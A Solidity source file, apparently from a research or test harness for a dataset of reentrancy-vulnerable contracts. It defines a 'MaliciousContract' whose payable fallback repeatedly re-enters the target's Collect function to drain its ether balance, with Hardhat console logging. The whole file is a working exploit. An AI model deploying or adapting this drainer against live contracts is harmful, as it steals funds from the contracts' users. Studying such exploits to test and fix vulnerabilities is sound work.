pragma solidity ^0.4.19;

import "../dataset/reentrancy/0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b.sol";
import "hardhat/console.sol";
contract MaliciousContract {
    PENNY_BY_PENNY penny_by_penny;
    uint reentrancyAttempts;

    constructor(address _penny_by_penny) public {
        penny_by_penny = PENNY_BY_PENNY(_penny_by_penny);
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "Must send at least 1 ether");
        reentrancyAttempts+= 1;
        console.log("Reentrancy Attemp %s", reentrancyAttempts);
        penny_by_penny.Collect(msg.value);
    }

    function deposit(uint timeLock) public payable {
        require(msg.value >= 1 ether, "Must add at least 1 ether");
        penny_by_penny.Put.value(msg.value)(timeLock);
    }

    function() payable public {
        // Re-enter the vulnerable function if there's still balance to collect
        if (address(penny_by_penny).balance >= 1 ether) {
            console.log("Reentrancy Attemp %s", reentrancyAttempts);
            reentrancyAttempts+= 1;
            penny_by_penny.Collect(1 ether);
        }
    }
}